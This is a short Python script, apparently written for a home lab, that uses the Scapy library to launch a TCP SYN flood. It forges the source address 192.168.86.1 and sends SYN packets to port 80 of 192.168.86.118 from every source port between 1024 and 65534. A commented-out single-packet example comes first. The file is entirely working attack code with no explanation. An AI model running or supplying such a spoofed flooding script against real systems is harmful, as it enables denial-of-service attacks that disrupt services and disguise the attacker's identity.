from scapy.all import *
from scapy.layers.inet import IP, TCP
#from kamene.all import *
#from kamene.layers.inet import IP, TCP
#from kamene.volatile import RandShort
'''
iplayer = IP(dst="192.168.86.1", id=1111, ttl=99)
tcplayer = TCP(sport=RandShort(), dport=[80], seq=12345, ack=1000, window=1000, flags="S")
packet = iplayer / tcplayer
send(packet)
'''

def synFlood(src, tgt):
    for sport in range(1024, 65535):
        L3 = IP(src = src, dst = tgt)
        L4 = TCP(sport=sport, dport=80)
        pkt = L3/L4
        send(pkt)

src = "192.168.86.1"
tgt = "192.168.86.118"
synFlood(src, tgt)